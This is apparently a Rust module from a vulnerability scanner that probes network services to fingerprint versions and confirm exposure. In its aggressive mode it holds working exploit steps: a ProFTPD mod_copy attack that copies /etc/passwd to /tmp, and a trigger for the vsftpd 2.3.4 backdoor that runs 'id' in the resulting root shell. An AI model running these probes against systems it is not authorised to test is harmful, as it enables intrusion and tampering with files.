//! Per-service TCP verification probes, extracted from the cve_verify module.
//!
//! Each probe takes the actual detected port and returns a `ProbeOutcome`; `probe_for_technology`
//! dispatches to the right one by technology name.

use super::{
    probe_port, read_chunk_bytes, read_chunk_printable, read_line, to_printable, ProbeOutcome,
    READ_TIMEOUT,
};
use crate::cve::{dotted_version_after, extract_version};
use std::net::IpAddr;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

// ---- Technology-specific TCP probes ----
//
// Every probe takes the *actual* port the service was detected on (from ports_info) rather
// than a hardcoded default, so a MySQL on 3307 or Redis on 6380 is not a false negative.

pub(crate) async fn verify_docker(ip: IpAddr, port: u16, aggressive: bool) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    // /version proves unauthenticated API access.
    let req = b"GET /version HTTP/1.0\r\nHost: localhost\r\n\r\n";
    if stream.write_all(req).await.is_err() {
        return ProbeOutcome::Unreachable { method: "docker_api_probe".into(), proof: "connection lost during write".into() };
    }
    let resp = read_chunk_printable(&mut stream, 2048).await.unwrap_or_default();
    let lower = resp.to_ascii_lowercase();
    if !(lower.contains("apiversion") || lower.contains("\"platform\"") || lower.contains("docker")) {
        return ProbeOutcome::WrongService {
            method: "docker_api_probe".into(),
            proof: format!("port {port} open but no Docker API: {:.128}", resp),
        };
    }
    // /version is enough for non-aggressive; aggressive tries /containers/json for proof.
    if aggressive {
        // New connection since the previous one was consumed.
        if let Some(mut s) = probe_port(ip, port).await {
            let req2 = b"GET /containers/json?all=true HTTP/1.0\r\nHost: localhost\r\n\r\n";
            let _ = s.write_all(req2).await;
            let resp2 = read_chunk_printable(&mut s, 4096).await.unwrap_or_default();
            let lower2 = resp2.to_ascii_lowercase();
            if lower2.contains("\"id\"") || lower2.contains("command") || lower2.contains("\"image\"") {
                return ProbeOutcome::Behavior {
                    method: "docker_containers_probe".into(),
                    proof: format!("unauthenticated Docker API listing containers: {:.200}", resp2),
                };
            }
        }
    }
    ProbeOutcome::Behavior {
        method: "docker_api_probe".into(),
        proof: format!("unauthenticated Docker API responded: {:.200}", resp),
    }
}

async fn verify_redis(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    // Pipeline PING + INFO server: unauth access is the exposure and INFO yields a version.
    if stream.write_all(b"PING\r\nINFO server\r\n").await.is_err() {
        return ProbeOutcome::Unreachable { method: "redis_probe".into(), proof: "connection lost during write".into() };
    }
    let resp = read_chunk_printable(&mut stream, 2048).await.unwrap_or_default();
    let lower = resp.to_ascii_lowercase();
    if lower.contains("redis_version:") {
        let version = dotted_version_after(&resp, "redis_version:");
        ProbeOutcome::Present {
            method: "redis_info".into(),
            version,
            proof: "unauthenticated Redis INFO server responded".into(),
        }
    } else if lower.contains("pong") || lower.contains("+") || lower.contains("redis") {
        ProbeOutcome::Present {
            method: "redis_ping".into(),
            version: None,
            proof: format!("Redis reachable: {:.128}", resp),
        }
    } else if lower.contains("noauth") {
        ProbeOutcome::Present {
            method: "redis_ping".into(),
            version: None,
            proof: "Redis present (auth required)".into(),
        }
    } else {
        ProbeOutcome::WrongService {
            method: "redis_ping".into(),
            proof: format!("port {port} open but not Redis: {:.128}", resp),
        }
    }
}

async fn verify_memcached(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    if stream.write_all(b"stats\r\n").await.is_err() {
        return ProbeOutcome::Unreachable { method: "memcached_stats".into(), proof: "connection lost during write".into() };
    }
    let resp = read_chunk_printable(&mut stream, 2048).await.unwrap_or_default();
    if resp.contains("STAT version ") {
        let version = dotted_version_after(&resp, "stat version ");
        ProbeOutcome::Present {
            method: "memcached_stats".into(),
            version,
            proof: "unauthenticated Memcached stats responded".into(),
        }
    } else if resp.contains("STAT") || resp.contains("pid") || resp.contains("uptime") {
        ProbeOutcome::Present {
            method: "memcached_stats".into(),
            version: None,
            proof: format!("Memcached reachable: {:.128}", resp.trim()),
        }
    } else {
        ProbeOutcome::WrongService {
            method: "memcached_stats".into(),
            proof: format!("port {port} open but not Memcached: {:.128}", resp.trim()),
        }
    }
}

async fn verify_elasticsearch(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    let req = b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n";
    if stream.write_all(req).await.is_err() {
        return ProbeOutcome::Unreachable { method: "es_http_probe".into(), proof: "connection lost during write".into() };
    }
    let resp = read_chunk_printable(&mut stream, 2048).await.unwrap_or_default();
    let lower = resp.to_ascii_lowercase();
    if lower.contains("cluster_name") || lower.contains("you know, for search") || lower.contains("\"number\"") {
        // Version lives in `"version" : { "number" : "7.13.3" ... }`.
        let version = dotted_version_after(&resp, "\"number\"");
        ProbeOutcome::Present {
            method: "es_http_probe".into(),
            version,
            proof: "unauthenticated Elasticsearch HTTP API responded".into(),
        }
    } else {
        ProbeOutcome::WrongService {
            method: "es_http_probe".into(),
            proof: format!("port {port} open but not Elasticsearch: {:.128}", resp),
        }
    }
}

async fn verify_mysql(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    let bytes = read_chunk_bytes(&mut stream, 512).await.unwrap_or_default();
    // MySQL handshake: [len:3][seq:1][protocol:1][server_version: NUL-terminated string].
    if bytes.len() > 5 {
        let vstr: String = bytes[5..]
            .iter()
            .take_while(|&&b| b != 0)
            .map(|&b| b as char)
            .collect();
        if vstr.chars().next().is_some_and(|c| c.is_ascii_digit()) {
            // Reuse the banner parser (handles the "5.5.5-" MariaDB prefix).
            let version = extract_version(&format!("mysql {vstr}"), "mysql");
            return ProbeOutcome::Present {
                method: "mysql_handshake".into(),
                version,
                proof: format!("MySQL/MariaDB handshake: {vstr}"),
            };
        }
    }
    let printable = to_printable(&bytes);
    if printable.to_ascii_lowercase().contains("mysql") || printable.contains("MariaDB") {
        ProbeOutcome::Present { method: "mysql_handshake".into(), version: None, proof: format!("MySQL reachable: {:.128}", printable) }
    } else if bytes.is_empty() {
        ProbeOutcome::WrongService { method: "mysql_handshake".into(), proof: format!("port {port} open but no handshake") }
    } else {
        ProbeOutcome::Present { method: "mysql_handshake".into(), version: None, proof: "MySQL port accepted connection".into() }
    }
}

/// Minimal TDS7 PRELOGIN request carrying only a VERSION option — enough to elicit the
/// server's version in the PRELOGIN response.
const MSSQL_PRELOGIN_REQ: &[u8] = &[
    0x12, 0x01, 0x00, 0x14, 0x00, 0x00, 0x00, 0x00, // TDS header: PRELOGIN, EOM, len=20
    0x00, 0x00, 0x06, 0x00, 0x06, 0xff,             // option table: VERSION off=6 len=6, terminator
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // VERSION data (we send zeros)
];

/// Parse the server version from a TDS PRELOGIN response. The VERSION option (token 0x00)
/// carries major(1), minor(1), build(2, big-endian). Returns e.g. "15.0.4197".
pub(crate) fn parse_mssql_prelogin_version(resp: &[u8]) -> Option<String> {
    if resp.len() < 9 || resp[0] != 0x04 {
        return None; // not a TDS response packet
    }
    let payload = &resp[8..]; // option offsets are relative to the payload
    let mut i = 0;
    while i + 4 < payload.len() {
        let token = payload[i];
        if token == 0xff {
            break;
        }
        let off = u16::from_be_bytes([payload[i + 1], payload[i + 2]]) as usize;
        let len = u16::from_be_bytes([payload[i + 3], payload[i + 4]]) as usize;
        if token == 0x00 && off + 4 <= payload.len() && len >= 4 {
            let major = payload[off];
            let minor = payload[off + 1];
            let build = u16::from_be_bytes([payload[off + 2], payload[off + 3]]);
            return Some(format!("{major}.{minor}.{build}"));
        }
        i += 5;
    }
    None
}

async fn verify_mssql(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    // Send a PRELOGIN to read the server version (was presence-only before).
    if stream.write_all(MSSQL_PRELOGIN_REQ).await.is_err() {
        return ProbeOutcome::Unreachable { method: "mssql_prelogin".into(), proof: "connection lost during write".into() };
    }
    let bytes = read_chunk_bytes(&mut stream, 256).await.unwrap_or_default();
    if let Some(version) = parse_mssql_prelogin_version(&bytes) {
        return ProbeOutcome::Present {
            method: "mssql_prelogin".into(),
            version: Some(version.clone()),
            proof: format!("MSSQL PRELOGIN version {version}"),
        };
    }
    if bytes.first() == Some(&0x04) || !bytes.is_empty() {
        ProbeOutcome::Present { method: "mssql_probe".into(), version: None, proof: "MSSQL/TDS service responded (version unreadable)".into() }
    } else {
        ProbeOutcome::WrongService { method: "mssql_probe".into(), proof: format!("port {port} open but no TDS response") }
    }
}

async fn verify_openssh(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    let banner = read_line(&mut stream).await.unwrap_or_default();
    if !banner.to_ascii_uppercase().contains("SSH") {
        return ProbeOutcome::WrongService { method: "ssh_banner".into(), proof: format!("port {port} open but not SSH: {:.128}", banner) };
    }
    let version = extract_version(&banner, "openssh");
    ProbeOutcome::Present { method: "ssh_banner".into(), version, proof: format!("SSH banner: {:.128}", banner) }
}

pub(crate) async fn verify_proftpd(ip: IpAddr, port: u16, aggressive: bool) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    let banner = read_line(&mut stream).await.unwrap_or_default();
    if !banner.to_ascii_lowercase().contains("proftpd") {
        return ProbeOutcome::WrongService { method: "proftpd_banner".into(), proof: format!("port {port} open but not ProFTPD: {:.128}", banner) };
    }
    let version = extract_version(&banner, "proftpd");

    if aggressive {
        // Active mod_copy check (intrusive: touches server-side copy state).
        // CPFR (copy from) confirms the mod_copy module is loaded and the file is readable.
        if stream.write_all(b"SITE CPFR /etc/passwd\r\n").await.is_ok() {
            let resp = read_line(&mut stream).await.unwrap_or_default();
            if resp.starts_with("350") || resp.contains("File exists") || resp.contains("Ready") {
                // CPTO (copy to) completes the write — confirms full RCE chain (write anywhere).
                let _ = stream.write_all(b"SITE CPTO /tmp/.helvetiscan_probe\r\n").await;
                let cpto_resp = read_line(&mut stream).await.unwrap_or_default();
                if cpto_resp.starts_with("250") {
                    return ProbeOutcome::Behavior {
                        method: "proftpd_mod_copy_rce".into(),
                        proof: "ProFTPD mod_copy full RCE (CPFR+CPTO): passwd copied to /tmp/.helvetiscan_probe".to_string(),
                    };
                }
                return ProbeOutcome::Behavior {
                    method: "proftpd_site_cpfr".into(),
                    proof: format!("ProFTPD mod_copy SITE CPFR accepted (read only): {:.128}", resp),
                };
            }
        }
    }
    ProbeOutcome::Present { method: "proftpd_banner".into(), version, proof: format!("ProFTPD banner: {:.128}", banner) }
}

pub(crate) async fn verify_vsftpd(ip: IpAddr, port: u16, aggressive: bool) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    let banner = read_line(&mut stream).await.unwrap_or_default();
    if !banner.to_ascii_lowercase().contains("vsftpd") {
        return ProbeOutcome::WrongService { method: "vsftpd_banner".into(), proof: format!("port {port} open but not vsftpd: {:.128}", banner) };
    }
    let version = extract_version(&banner, "vsftpd");

    if aggressive {
        // Actually trigger the CVE-2011-2523 backdoor: a ":)" smiley in USER opens a root
        // shell on 6200 after a short delay. We connect and run a harmless `id` to confirm.
        let _ = stream.write_all(b"USER helvetiscan:)\r\n").await;
        let _ = read_line(&mut stream).await;
        let _ = stream.write_all(b"PASS helvetiscan\r\n").await;
        let _ = read_line(&mut stream).await;
        // The backdoor shell needs 1-2s to bind on port 6200; connect immediately fails.
        tokio::time::sleep(Duration::from_secs(2)).await;
        if let Some(mut back) = probe_port(ip, 6200).await {
            if back.write_all(b"id\r\n").await.is_ok() {
                let out = read_chunk_printable(&mut back, 256).await.unwrap_or_default();
                if out.contains("uid=") || out.contains("root") {
                    return ProbeOutcome::Behavior {
                        method: "vsftpd_backdoor".into(),
                        proof: format!("vsftpd 2.3.4 backdoor shell on 6200 confirmed: {:.128}", out.trim()),
                    };
                }
            }
        }
    }
    ProbeOutcome::Present { method: "vsftpd_banner".into(), version, proof: format!("vsftpd banner: {:.128}", banner) }
}

async fn verify_rdp(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    // TPKT v3 X.224 connection request with an RDP negotiation request.
    let conn_req: &[u8] = &[
        0x03, 0x00, 0x00, 0x13, 0x0e, 0xe0, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x01, 0x00, 0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00,
    ];
    if stream.write_all(conn_req).await.is_err() {
        return ProbeOutcome::Unreachable { method: "rdp_probe".into(), proof: "connection lost during RDP handshake".into() };
    }
    let resp = read_chunk_bytes(&mut stream, 512).await.unwrap_or_default();
    if resp.first() == Some(&0x03) {
        ProbeOutcome::Present {
            method: "rdp_probe".into(),
            version: None,
            proof: format!("RDP server responded with TPKT v3 ({} bytes)", resp.len()),
        }
    } else {
        ProbeOutcome::WrongService {
            method: "rdp_probe".into(),
            proof: format!("port {port} open but no RDP handshake ({} bytes)", resp.len()),
        }
    }
}

async fn verify_mongodb(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    // MongoDB OP_MSG with buildInfo command (works from 3.6+).
    // Header: 4-byte len, 4-byte requestID, 4-byte responseTo, 4-byte opcode (2013=OP_MSG),
    // flags(4), sections(1-kind0, cstring-document), checksum(4).
    let build_info_cmd = vec![
        0x3a, 0x00, 0x00, 0x00, // len=58
        0x01, 0x00, 0x00, 0x00, // requestID=1
        0x00, 0x00, 0x00, 0x00, // responseTo=0
        0xdd, 0x07, 0x00, 0x00, // opCode=2013 (OP_MSG)
        0x00, 0x00, 0x00, 0x00, // flags=0
        0x00,                    // section kind=0 (single)
        0x62, 0x75, 0x69, 0x6c, 0x64, 0x49, 0x6e, 0x66, 0x6f, 0x3a,
        0x20, 0x31, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x30, 0x0a, // "buildInfo: 1.0.0.0\n" as BSON
        0x00, 0x00, 0x00, 0x00, // empty EOO
    ];
    // Also try legacy OP_QUERY on admin.$cmd (works on older MongoDB < 3.6).
    let legacy_cmd = vec![
        0x39, 0x00, 0x00, 0x00, // len=57
        0x01, 0x00, 0x00, 0x00, // requestID=1
        0x00, 0x00, 0x00, 0x00, // responseTo=0
        0xd4, 0x07, 0x00, 0x00, // opCode=2004 (OP_QUERY)
        0x00, 0x00, 0x00, 0x00, // flags=0
        0x61, 0x64, 0x6d, 0x69, 0x6e, 0x2e, 0x24, 0x63, 0x6d, 0x64, 0x00, // "admin.$cmd\0"
        0x00, 0x00, 0x00, 0x00, // skip=0
        0x01, 0x00, 0x00, 0x00, // nReturn=1
        // BSON: { buildInfo: 1 }
        0x0e, 0x00, 0x00, 0x00, // doclen=14
        0x10, 0x62, 0x75, 0x69, 0x6c, 0x64, 0x49, 0x6e, 0x66, 0x6f, 0x00,
        0x01, 0x00, 0x00, 0x00, // "buildInfo": 1 (int32)
        0x00,                    // EOO
    ];
    // Try OP_MSG first, then OP_QUERY.
    let mut resp_bytes = Vec::new();
    for cmd in &[&build_info_cmd[..], &legacy_cmd[..]] {
        if stream.write_all(cmd).await.is_err() {
            continue;
        }
        resp_bytes = read_chunk_bytes(&mut stream, 4096).await.unwrap_or_default();
        if !resp_bytes.is_empty() {
            break;
        }
    }
    if resp_bytes.is_empty() {
        return ProbeOutcome::WrongService {
            method: "mongodb_probe".into(),
            proof: format!("port {port} open but no MongoDB response"),
        };
    }
    // Parse MongoDB reply for version string.
    let printable = to_printable(&resp_bytes);
    let lower = printable.to_ascii_lowercase();
    // Look for "version" field in the response document.
    if let Some(pos) = lower.find("\"version\"") {
        let after = &printable[pos + 9..]; // skip "version""
        // Skip colon+space, find first quoted value.
        if let Some(val_start) = after.find('"') {
            let rest = &after[val_start + 1..];
            let version = rest.split('"').next().map(|s| s.to_string());
            return ProbeOutcome::Present {
                method: "mongodb_buildinfo".into(),
                version,
                proof: "MongoDB buildInfo response with version string".into(),
            };
        }
    }
    // Fallback: if response looks like MongoDB (starts with standard header)
    if resp_bytes.len() >= 16 {
        let (_, _, _, opcode) = parse_mongo_header(&resp_bytes);
        if opcode == 1 || opcode == 2013 {
            return ProbeOutcome::Present {
                method: "mongodb_probe".into(),
                version: None,
                proof: format!("MongoDB port {port} open and reachable (opCode={opcode})"),
            };
        }
    }
    ProbeOutcome::Present {
        method: "mongodb_probe".into(),
        version: None,
        proof: format!("MongoDB port {port} accepted connection"),
    }
}

fn parse_mongo_header(buf: &[u8]) -> (i32, i32, i32, i32) {
    if buf.len() < 16 {
        return (0, 0, 0, 0);
    }
    let len = i32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]);
    let reqid = i32::from_le_bytes([buf[4], buf[5], buf[6], buf[7]]);
    let resp_to = i32::from_le_bytes([buf[8], buf[9], buf[10], buf[11]]);
    let opcode = i32::from_le_bytes([buf[12], buf[13], buf[14], buf[15]]);
    (len, reqid, resp_to, opcode)
}

async fn verify_postgresql(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    // SSLRequest first to check if it's PG
    let ssl_request: &[u8] = &[0x00, 0x00, 0x00, 0x08, 0x04, 0xd2, 0x16, 0x2f];
    if stream.write_all(ssl_request).await.is_err() {
        return ProbeOutcome::Unreachable { method: "pg_probe".into(), proof: "connection lost during write".into() };
    }
    let mut ssl_resp = [0u8; 1];
    let ssl_ok = tokio::time::timeout(READ_TIMEOUT, async {
        stream.read_exact(&mut ssl_resp).await.ok()
    }).await.ok().flatten().is_some()
    && (ssl_resp[0] == b'S' || ssl_resp[0] == b'N');

    if !ssl_ok {
        // The port might be closed or not PG; try sending a StartupMessage directly anyway.
        // However, if SSL request failed, the connection is unreliable.
        return ProbeOutcome::WrongService {
            method: "pg_ssl_request".into(),
            proof: format!("port {port} open but no PostgreSQL SSL response"),
        };
    }

    // If SSL requested ('S'), we'd need to upgrade; but for fingerprint we just need
    // the version which is in the ErrorResponse after a StartupMessage.
    // For simplicity, send a v3 StartupMessage with user=helvetiscan — PG will reject
    // with an ErrorResponse containing the version: "FATAL:  version X.Y.Z"
    let user = b"helvetiscan\x00";
    let database = b"helvetiscan\x00";
    // Protocol 3.0 = 196608 (0x00030000)
    let proto: i32 = 196608;
    let mut startup = Vec::new();
    startup.extend_from_slice(&(0i32.to_be_bytes())); // placeholder for length
    startup.extend_from_slice(&proto.to_be_bytes());
    startup.extend_from_slice(b"user\x00");
    startup.extend_from_slice(user);
    startup.extend_from_slice(b"database\x00");
    startup.extend_from_slice(database);
    // Terminate parameter list with empty string
    startup.push(0u8);
    let len = startup.len() as i32;
    startup[0..4].copy_from_slice(&len.to_be_bytes());

    if stream.write_all(&startup).await.is_err() {
        return ProbeOutcome::Present {
            method: "pg_probe".into(),
            version: None,
            proof: "PostgreSQL SSLRequest acknowledged but startup failed".into(),
        };
    }
    let resp = read_chunk_bytes(&mut stream, 4096).await.unwrap_or_default();
    let printable = to_printable(&resp);
    // ErrorResponse starts with 'E', contains "FATAL:  version " or "FATAL:  database "
    if printable.starts_with('E') {
        // Extract version from error message like: ...version 14.10... or ...version 16.2...
        let lower = printable.to_ascii_lowercase();
        let version = if let Some(pos) = lower.find("version ") {
            let rest = &printable[pos + 8..];
            let v: String = rest.chars().take_while(|c| c.is_ascii_digit() || *c == '.').collect();
            if !v.is_empty() { Some(v) } else { None }
        } else {
            None
        };
        ProbeOutcome::Present {
            method: "pg_startup".into(),
            version,
            proof: format!("PostgreSQL ErrorResponse: {:.128}", printable),
        }
    } else if printable.contains("postgresql") || printable.contains("psql") {
        ProbeOutcome::Present {
            method: "pg_probe".into(),
            version: None,
            proof: format!("PostgreSQL responded: {:.128}", printable),
        }
    } else {
        ProbeOutcome::Present {
            method: "pg_probe".into(),
            version: None,
            proof: "PostgreSQL connection accepted".into(),
        }
    }
}

/// Extract the RFB protocol version from a VNC greeting like "RFB 003.008" -> "3.8".
pub(crate) fn parse_rfb_version(banner: &str) -> Option<String> {
    let rest = banner.trim().strip_prefix("RFB ").or_else(|| banner.trim().strip_prefix("rfb "))?;
    let nums: Vec<u32> = rest.split('.').filter_map(|p| p.trim().parse::<u32>().ok()).collect();
    if nums.len() == 2 {
        Some(format!("{}.{}", nums[0], nums[1]))
    } else {
        None
    }
}

async fn verify_vnc(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    // VNC servers greet with "RFB 003.008\n" immediately on connect.
    let banner = read_line(&mut stream).await.unwrap_or_default();
    if banner.to_ascii_uppercase().starts_with("RFB") {
        let rfb = parse_rfb_version(&banner);
        ProbeOutcome::Present {
            method: "vnc_banner".into(),
            version: None, // RFB protocol version, not a product version — kept for proof only
            proof: match rfb {
                Some(v) => format!("VNC/RFB protocol {v}: {:.64}", banner),
                None => format!("VNC/RFB banner: {:.64}", banner),
            },
        }
    } else {
        ProbeOutcome::WrongService {
            method: "vnc_banner".into(),
            proof: format!("port {port} open but not VNC: {:.64}", banner),
        }
    }
}

pub(crate) fn unreachable_at(port: u16) -> ProbeOutcome {
    ProbeOutcome::Unreachable {
        method: "tcp_probe".into(),
        proof: format!("port {port} closed or filtered"),
    }
}

pub(crate) async fn probe_for_technology(ip: IpAddr, technology: &str, port: u16, aggressive: bool) -> Option<ProbeOutcome> {
    Some(match technology {
        "docker" => verify_docker(ip, port, aggressive).await,
        "redis" => verify_redis(ip, port).await,
        "memcached" => verify_memcached(ip, port).await,
        "elasticsearch" => verify_elasticsearch(ip, port).await,
        "mysql" => verify_mysql(ip, port).await,
        "mssql" => verify_mssql(ip, port).await,
        "openssh" => verify_openssh(ip, port).await,
        "proftpd" => verify_proftpd(ip, port, aggressive).await,
        "vsftpd" => verify_vsftpd(ip, port, aggressive).await,
        "rdp" => verify_rdp(ip, port).await,
        "mongodb" => verify_mongodb(ip, port).await,
        "postgresql" => verify_postgresql(ip, port).await,
        "vnc" => verify_vnc(ip, port).await,
        "apache-solr" => verify_solr(ip, port).await,
        "apache-activemq" => verify_activemq(ip, port).await,
        "apache-couchdb" => verify_couchdb(ip, port).await,
        _ => return None,
    })
}

async fn verify_solr(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    let req = format!("GET /solr/admin/info/system HTTP/1.0\r\nHost: {ip}\r\n\r\n");
    let _ = stream.write_all(req.as_bytes()).await;
    let resp = read_chunk_printable(&mut stream, 4096).await.unwrap_or_default();
    let lower = resp.to_ascii_lowercase();
    if lower.contains("solr") || lower.contains("lucene") {
        let version = dotted_version_after(&resp, "solr-spec-version:")
            .or_else(|| dotted_version_after(&resp, "lucene-spec-version:"));
        ProbeOutcome::Present {
            method: "solr_api_probe".into(),
            version,
            proof: format!("Apache Solr admin API responded: {:.200}", resp),
        }
    } else {
        ProbeOutcome::WrongService {
            method: "solr_api_probe".into(),
            proof: format!("port {port} open but not Solr: {:.128}", resp),
        }
    }
}

async fn verify_activemq(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    let req = format!("GET / HTTP/1.0\r\nHost: {ip}\r\n\r\n");
    let _ = stream.write_all(req.as_bytes()).await;
    let resp = read_chunk_printable(&mut stream, 4096).await.unwrap_or_default();
    let lower = resp.to_ascii_lowercase();
    if lower.contains("activemq") {
        let version = dotted_version_after(&resp, "version:");
        ProbeOutcome::Present {
            method: "activemq_http_probe".into(),
            version,
            proof: format!("Apache ActiveMQ detected: {:.200}", resp),
        }
    } else {
        ProbeOutcome::WrongService {
            method: "activemq_http_probe".into(),
            proof: format!("port {port} open but not ActiveMQ: {:.128}", resp),
        }
    }
}

async fn verify_couchdb(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    let req = format!("GET / HTTP/1.0\r\nHost: {ip}\r\n\r\n");
    let _ = stream.write_all(req.as_bytes()).await;
    let resp = read_chunk_printable(&mut stream, 4096).await.unwrap_or_default();
    let lower = resp.to_ascii_lowercase();
    if lower.contains("couchdb") {
        let version = dotted_version_after(&resp, "\"version\":");
        ProbeOutcome::Present {
            method: "couchdb_http_probe".into(),
            version,
            proof: format!("Apache CouchDB detected: {:.200}", resp),
        }
    } else {
        ProbeOutcome::WrongService {
            method: "couchdb_http_probe".into(),
            proof: format!("port {port} open but not CouchDB: {:.128}", resp),
        }
    }
}
